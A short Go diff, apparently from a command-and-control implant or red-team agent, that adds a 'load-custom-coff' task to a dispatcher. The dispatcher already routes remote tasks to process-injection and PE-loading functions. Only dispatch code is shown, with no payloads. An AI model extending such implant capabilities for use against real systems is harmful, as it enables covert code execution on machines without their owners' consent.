@@ -224,6 +224,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = processinjection.SpawnInjectReadPipe(t.File, t.Args)
 	case "spawn-inject-token":
 		result, cmdError = processinjection.SpawnInjectWithToken(t.File, t.Args[0], t.Args[1])
+	case "load-custom-coff":
+		result, cmdError = processinjection.LoadCOFF(t.File)
 	case "load-custom-pe":
 		result, cmdError = processinjection.LoadPE(t.File, t.Args)
 	case "load-custom-pe-pipe":
